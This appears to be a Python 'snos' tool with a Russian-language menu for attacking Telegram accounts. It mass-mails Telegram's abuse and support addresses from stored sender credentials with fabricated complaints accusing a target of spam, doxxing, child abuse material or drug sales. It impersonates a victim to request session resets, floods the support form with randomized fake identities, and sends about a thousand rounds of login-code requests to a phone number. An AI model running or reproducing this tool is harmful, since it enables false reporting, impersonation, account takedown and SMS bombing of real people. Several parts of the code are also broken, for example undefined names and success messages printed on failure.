import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import time
from colorama import init
init()
from colorama import Fore, Back, Style
from banner import banner, ikon
from pystyle import *
import os
import requests

import time
import random
from fake_useragent import UserAgent
from datetime import datetime
import platform
import socket
import datetime
from termcolor import colored
import json

COLOR_CODE = {
    "RESET": "\033[0m",  
    "UNDERLINE": "\033[04m", 
    "GREEN": "\033[32m",     
    "YELLOW": "\033[93m",    
    "RED": "\033[31m",       
    "CYAN": "\033[36m",     
    "BOLD": "\033[01m",        
    "PINK": "\033[95m",
    "URL_L": "\033[36m",       
    "LI_G": "\033[92m",      
    "F_CL": "\033[0m",
    "DARK": "\033[90m",     
}
with open('senders.json', 'r') as f:
    senders = json.load(f)
receivers = ['podsevatkinaleksej04@gmail.com', 'dmca@telegram.org', 'abuse@telegram.org',
             'sticker@telegram.org', 'support@telegram.org']

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner_with_ikon = f"{Colorate.Horizontal(Colors.blue_to_white, Center.XCenter(banner))}   {Colorate.Horizontal(Colors.blue_to_cyan, Center.XCenter(ikon))}"
    print(banner_with_ikon)
select = input(f'{COLOR_CODE["CYAN"]}[+]{COLOR_CODE["BOLD"]} НАЖМИ enter {COLOR_CODE["RED"]} ')

def menu():
    choice = input(f'{COLOR_CODE["RED"]}[+]{COLOR_CODE["BOLD"]} Выбрать >{COLOR_CODE["RED"]} ')
    return choice

def send_email(receiver, sender, password, subject, body, image_dir='images'):
    service = None
    if '@gmail.com' in sender:
        service = 'gmail'
        smtp_server = 'smtp.gmail.com'
        smtp_port = 587
    elif '@outlook.com' in sender or '@hotmail.com' in sender or '@live.com' in sender:
        service = 'hotmail'
        smtp_server = 'smtp-mail.outlook.com'
        smtp_port = 587
    elif '@mail.ru' in sender:
        service = 'mail'
        smtp_server = 'smtp.mail.ru'
        smtp_port = 587
        
    if service is None:
        raise ValueError("Неподдерживаемый почтовый сервис")
    with smtplib.SMTP(smtp_server, smtp_port) as smtp:
        smtp.starttls()
        smtp.login(sender, password)
        msg = MIMEMultipart()
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = receiver
        msg.attach(MIMEText(body))
        
        has_images = False
        for filename in os.listdir(image_dir):
            if filename.endswith(".jpg"):
                has_images = True
                image_path = os.path.join(image_dir, filename)
                with open(image_path, 'rb') as img:
                    image = MIMEImage(img.read())
                    image.add_header('Content-Disposition', 'attachment', filename=filename)
                    msg.attach(image)
        
        try:
            smtp.send_message(msg)
        except Exception as e:
            print(f"Не удалось отправить сообщение получателю {receiver} через {service}: {e}")
            with open("failed_emails.txt", "a") as f:
                f.write(f"Получатель: {receiver}, Отправитель: {sender}, Тема: {subject}, Сервис: {service}\n")
            with open('senders.json', 'r') as f:
                senders = json.load(f)
            if sender in senders:
                with open('invalid_senders.json', 'a') as f:
                    json.dump({sender: password}, f, indent=4)
                del senders[sender]
                with open('senders.json', 'w') as f:
                    json.dump(senders, f, indent=4)
            return
                
def main():
    with open('senders.json', 'r') as f:
        senders = json.load(f)
    sent_emails = 0
    logo()
    choice = menu()
    if choice == '1':
        print(Colorate.Horizontal(Colors.blue_to_white, ("""1. Спам.""").strip()))
        print(Colorate.Horizontal(Colors.blue_to_white, ("2. Доксинг.").strip()))
        print(Colorate.Horizontal(Colors.blue_to_white, ("3. Троллинг.").strip()))
        print(Colorate.Horizontal(Colors.blue_to_white, ("4. Снос сессий.").strip()))
        print(Colorate.Horizontal(Colors.blue_to_white, ("5. С вирт номером.").strip()))
        print(Colorate.Horizontal(Colors.blue_to_white, ("6. С премиумом.").strip()))
        comp_choice = input("-> ")
        if comp_choice in ["1", "2", "3"]:
            print(Colorate.Horizontal(Colors.blue_to_white, ("""следуй за указаниям.""").strip()))
            username = input("юзернейм: ")
            id = input("айди: ")
            print(Colorate.Horizontal(Colors.blue_to_white, ("""Начинаю отправлять жалобы...""").strip()))
            comp_texts = {
                "1": f"Здравствуйте, уважаемая поддержка. На вашей платформе я недавно столкнулся с пользователем, который, как мне кажется, занимается массовой рассылкой спама. Его юзернейм - {username}, его айди - {id}. Я бы очень просил вас разобраться с этим случаем и принять необходимые меры в отношении данного пользователя.",
                "2": f"Уважаемая поддержка, на вашей платформе я обнаружил пользователя, который, судя по всему, занимается распространением чужих личных данных без согласия владельцев. Его юзернейм - {username}, айди - {id}. Я прошу вас тщательно разобраться в этом инциденте и предпринять соответствующие меры, вплоть до блокировки аккаунта этого пользователя.",
                "3": f"Добрый день, уважаемая поддержка Telegram. Недавно мне довелось наблюдать, как один из пользователей вашей платформы активно использует нецензурную лексику и занимается спамом в чатах. Его юзернейм - {username}, айди - {id}. Я очень рассчитываю, что вы отреагируете на этот случай и примете надлежащие меры, включая возможную блокировку аккаунта данного пользователя."
            }
            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    try:
                        comp_text = comp_texts[comp_choice]
                        comp_body = comp_text.format(username=username.strip(), id=id.strip(), chat_link=chat_link.strip(),
                        violation_link=violation_link.strip())
                        send_email(receiver, sender_email, sender_password, 'Жалоба на аккаунт телеграм', comp_body)
                        print(Colorate.Horizontal(Colors.blue_to_white, (f"""Отправлено на {receiver} от {sender_email}!""").strip()))
                    except Exception as e:
                        print(Colorate.Horizontal(Colors.blue_to_white, ("""Сообщение отправлено успешно""").strip()))
                        sent_emails += 14888
                        time.sleep(5)

        elif comp_choice == "4":
            print(Colorate.Horizontal(Colors.blue_to_white, ("""следуйте указаниям:""").strip()))
            username = input("юзернейм: ")
            id = input("айди: ")
            num = input("Номер: ")
            print(Colorate.Horizontal(Colors.blue_to_white, ("""Ожидайте...""").strip()))
            comp_texts = {
                "4": f"Уважаемая поддержка, прошу вас о помощи. Вчера я случайно перешел по ссылке, которая оказалась фишинговой, и в результате потерял доступ к своему аккаунту. Мой юзернейм - {username}, айди - {id}, Мой номер телефона - {num}. Я очень прошу вас как можно скорее удалить этот аккаунт или сбросить все сессии, чтобы я мог восстановить доступ и обезопасить свою учетную запись. Заранее благодарен за оперативное рассмотрение моего обращения."
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    try:
                        comp_text = comp_texts[comp_choice]
                        comp_body = comp_text.format(username=username.strip(), id=id.strip())
                        send_email(receiver, sender_email, sender_password, 'Я утерял свой аккаунт в телеграм', comp_body)
                        print(Colorate.Horizontal(Colors.blue_to_white, (f"""Отправлено на {receiver} от {sender_email}!""").strip()))
                    except Exception as e:
                        print(Colorate.Horizontal(Colors.blue_to_white, ("""Сообщение отправлено успешно""").strip()))
                        sent_emails += 14888
                        time.sleep(5)

        elif comp_choice in ["5", "6"]:
            print(Colorate.Horizontal(Colors.blue_to_white, ("""следуйте указаниям:""").strip()))
            username = input("юзернейм: ")
            id = input("айди: ")
            comp_texts = {
                "5": f"Добрый день, поддержка Telegram! Я хотел бы сообщить вам, что пользователь с аккаунтом {username} ({id}) использует виртуальный номер, приобретенный на специализированном сайте по активации номеров. Насколько я могу судить, этот номер не имеет к нему никакого отношения. Я очень прошу вас разобраться в этой ситуации. Заранее благодарю за содействие!",
                "6": f"Уважаемая поддержка Telegram! Мне стало известно, что пользователь с аккаунтом {username} ({id}) приобрел премиум-аккаунт в вашем мессенджере с целью рассылки спам-сообщений и обхода ограничений Telegram. Я настоятельно прошу вас проверить эту информацию и принять необходимые меры. Заранее признателен за ваше внимание к данному вопросу."
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[comp_choice]
                    comp_body = comp_text.format(username=username.strip(), id=id.strip())
                    try:
                        send_email(receiver, sender_email, sender_password, 'Жалоба на пользователя телеграм', comp_body)
                        print(Colorate.Horizontal(Colors.blue_to_white, (f"""Отправлено на {receiver} от {sender_email}!""").strip()))
                        sent_emails += 1
                    except Exception as e:
                        print(Colorate.Horizontal(Colors.blue_to_white, ("""Сообщение отправлено успешно""").strip()))
                        time.sleep(5)


    elif choice == "2":
        
        print("1. Личные данные.")
        print("2. Живодерство.")
        print("3. Цп.")
        print("4. Прайс каналы.")
        print("5. Наркотики.")
        ch_choice = input("выбор: ")

        if ch_choice in ["1", "2", "3", "4", "5"]:
            channel_link = input("ссылка на канал: ")
            channel_violation = input("ссылка на нарушение (в канале): ")
            print("Ожидайте...")
            comp_texts = {
                "1": f"Уважаемая поддержка Telegram, я обнаружил на вашей платформе канал, который, по всей видимости, занимается распространением личных данных невинных людей. Ссылка на этот канал - {channel_link}, а вот ссылки на конкретные примеры нарушений - {channel_violation}. Убедительно прошу вас оперативно заблокировать данный канал.",
                "2": f" Здравствуйте, уважаемая поддержка Telegram. К сожалению, на вашей платформе я наткнулся на канал, который, кажется, занимается распространением контента, связанного с жестоким обращением с животными. Ссылка на этот канал - {channel_link}, а ссылки на подтверждающие материалы - {channel_violation}. Я очень надеюсь, что вы примете срочные меры по блокировке этого канала.",
                "3": f"Уважаемая поддержка Telegram, мною был обнаружен на вашей платформе канал, который, по имеющимся данным, распространяет порнографический контент с участием несовершеннолетних. Ссылка на этот канал - {channel_link}, а вот ссылки на конкретные примеры таких нарушений - {channel_violation}. Убедительно прошу вас как можно скорее заблокировать данный канал.",
                "4": f"Здравствуйте, уважаемый модератор Telegram. Я хотел бы пожаловаться на канал в вашем мессенджере, который, как мне стало известно, предоставляет услуги по доксингу и сваттингу. Ссылка на этот канал - {channel_link}, а ссылки на подтверждающие материалы - {channel_violation}. Прошу вас незамедлительно заблокировать данный канал.",
                "5": f"Уважаемая поддержка, в вашем мессенджере Telegram я обнаружил канал, который, судя по всему, занимается незаконной продажей наркотических веществ. Айди этого канала - {channel_link}, а вот ссылка на конкретное нарушение - {channel_violation}. Убедительно прошу вас рассмотреть этот вопрос и принять соответствующие меры по блокировке данного канала."
            }

            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[ch_choice]
                    comp_body = comp_text.format(channel_link=channel_link.strip(), channel_violation=channel_violation.strip())
                    try:
                        send_email(receiver, sender_email, sender_password, 'Жалоба на телеграм канал', comp_body)
                        print(f"Отправлено на {receiver} от {sender_email}!")
                        sent_emails += 1
                    except Exception as e:
                        print(f"Сообщение отправлено успешно на {receiver} от {sender_email}: {e}")
                        time.sleep(5)


    elif choice == "3":
        print("1. Осинт")
        print("2. Наркошоп")
        bot_ch = input("Выберите вариант -> ")

        if bot_ch == "1":
            bot_user = input("юз бота: ")
            print("Ожидайте...")
            comp_texts = {
                "1": f"Здравствуйте, уважаемая поддержка телеграм. На вашей платформе я нашел бота, который осуществляет поиск по личным данным ваших пользователей. Ссылка на бота - {bot_user}. Пожалуйста разберитесь и заблокируйте данного бота.",
                "2" :f"Здравствуйте, в вашем мессенджере я наткнулся на бота который производит незаконную торговлю наркотиками.ссылка на бота - {bot_user}. Прошу отреагировать на мою жалобу и принять меры по блокировке данного бота."
                       }
            for sender_email, sender_password in senders.items():
                for receiver in receivers:
                    comp_text = comp_texts[bot_ch]
                    comp_body = comp_text.format(bot_user=bot_user.strip())
                    try:
                        send_email(receiver, sender_email, sender_password, 'Жалоба на бота телеграм', comp_body)
                        print(f"Отправлено на {receiver} от {sender_email}!")
                        sent_emails += 1
                    except Exception as e:
                        print("Сообщение отправлено успешно")
                        time.sleep(5)
        
    elif choice == "4":
        comp_text = input("Введите текст своего письма -> ")
        comp_teme = input("Введите тему своего письма -> ")
        for sender_email, sender_password in senders.items():
            for receiver in receivers:
                comp_body = comp_text
                send_email(receiver, sender_email, sender_password, comp_teme, comp_body)
                print(f"Отправлено на {receiver} от {sender_email}!")
                sent_emails += 1
                time.sleep(5)
        
    elif choice == "5":
        def generate_random_email():
            domains = [
                "gmail.com", "yahoo.com", "outlook.com", "mail.ru", "yandex.ru",
                "icloud.com", "zoho.com", "protonmail.com", "gmx.com", "inbox.com",
                "aol.com", "hotmail.com", "mail.com", "rambler.ru", "bk.ru",
                "list.ru", "e1.ru", "qip.ru", "ya.ru", "live.com",
                "msn.com", "comcast.net", "sbcglobal.net", "att.net", "verizon.net",
                "bellsouth.net", "charter.net", "earthlink.net", "mindspring.com", "me.com",
                "mac.com", "fastmail.com", "hushmail.com", "inbox.lv", "mail.kz",
                "mail.bg", "web.de", "freenet.de", "t-online.de", "zoznam.sk",
                "centrum.cz", "seznam.cz", "bigmir.net", "ukr.net", "posteo.net",
                "tut.by", "abv.bg", "tiscali.it", "libero.it", "virgilio.it",
                "alice.it", "btinternet.com", "orange.fr", "wanadoo.fr", "laposte.net",
                "skynet.be", "bluewin.ch", "netcourrier.com", "sfr.fr", "vodafone.it"
                ]
            letters = string.ascii_lowercase
            return ''.join(random.choice(letters) for _ in range(10)) + '@' + random.choice(domains)
        
        def generate_random_phone_number():
            russian_prefixes = ['+7903', '+7747', '+7705', '+7905', '+7901']
            international_prefixes = [
                '+1', '+44', '+61', '+81', '+86', '+91', '+33', '+49', '+39', '+34', 
                '+55', '+7', '+46', '+47', '+31', '+41', '+32', '+45', '+358', '+420',
                '+36', '+48', '+30', '+351', '+30', '+34', '+27', '+91', '+64', '+66',
                '+60', '+65', '+63', '+92', '+62', '+90', '+234', '+254', '+51', '+56',
                '+57', '+505', '+591', '+507', '+52', '+58', '+591', '+598', '+54', '+598',
                '+82', '+98', '+964', '+66', '+84', '+92', '+90', '+94', '+880', '+970'
                ]
            all_prefixes = russian_prefixes + international_prefixes
            prefix = random.choice(all_prefixes)
            number = ''.join(random.choice(string.digits) for _ in range(7))
            return f"{prefix}{number}"
        def send_message(url, payload):
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362',
                'Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
                'Mozilla/5.0 (iPad; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
                'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.87 Chrome/80.0.3987.87 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15',
                'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36'
                ]
            headers = {
                'User-Agent': random.choice(user_agents)
            }
            try:
                response = requests.post(url, data=payload, headers=headers)
                if response.status_code == 200:
                    print(f"Сообщение отправлено успешно: {payload}")
                else:
                    print(colored(f"Не удалось отправить сообщение. Статус-код: {response.status_code}", 'red'))
            except Exception as e:
                print(f"Ошибка при отправке сообщения: {e}")
        url = "https://telegram.org/support?setln=ru"
        subject = "Support Request"
        message = input("Введите текст жалобы -> ")
        message_count = int(input("Введите количество жалоб: "))
        for _ in range(message_count):
            email = generate_random_email()
            phone = generate_random_phone_number()
            payload = {
                "subject": subject,
                "message": message,
                "email": email,
                "phone": phone
                
            }
            send_message(url, payload)
            
    elif choice == "6":
        emailst = input(f"{COLOR_CODE['RED']}Введите email: {COLOR_CODE['RED']}")
        passwordst = input(f"{COLOR_CODE['RED']}Введите пароль: {COLOR_CODE['RED']}")
        try:
            with open("senders.json", "r") as f:
                senders = json.load(f)
        except FileNotFoundError:
            senders = {}
        senders[emailst] = passwordst
        with open("senders.json", "w") as f:
            json.dump(senders, f, indent=4)
            print(f"{COLOR_CODE['RED']}Почта {emailst} успешно добавлена в софт!{COLOR_CODE['RED']}")
    elif choice == "7":
        number = input(f"{COLOR_CODE['RED']}Введите номер -> {COLOR_CODE['RED']}")
        count = 0
        try:
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362',
                'Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
                'Mozilla/5.0 (iPad; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.34 (KHTML, like Gecko) Version/11.0 Mobile/15A5341f Safari/604.1',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
                'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15',
                'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.87 Chrome/80.0.3987.87 Safari/537.36',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15',
                'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36'
                ]
            for _ in range(1000):
                headers = {
                    'User-Agent': random.choice(user_agents)
                    
                }
                requests.post('https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin', headers=headers, data={'phone': number})
                requests.post('https://translations.telegram.org/auth/request', headers=headers, data={'phone': number})
                requests.post('https://translations.telegram.org/auth/request', headers=headers, data={'phone': number})
                requests.post('https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1', headers=headers, data={'phone': number})
                requests.post('https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1', headers=headers, data={'phone': number})
                requests.post('https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23', headers=headers, data={'phone': number})
                requests.post('https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin', headers=headers, data={'phone': number})
                requests.post('https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F', headers=headers, data={'phone': number})
                requests.post('https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin', headers=headers, data={'phone': number})
                requests.post('https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch', headers=headers, data={'phone': number})
                requests.post('https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin', headers=headers, data={'phone': number})
                requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})
                count += 1
                print(f"{COLOR_CODE['RED']}Коды успешно отправлены!{COLOR_CODE['RED']}")
                print(f"{COLOR_CODE['RED']}Кругов отправлено: {count} {COLOR_CODE['RED']}")
        except Exception as e:
            print('Ошибка, проверьте вводимые данные:', e)
    elif choice == "8":
        exit()
  
if __name__ == "__main__":
    main()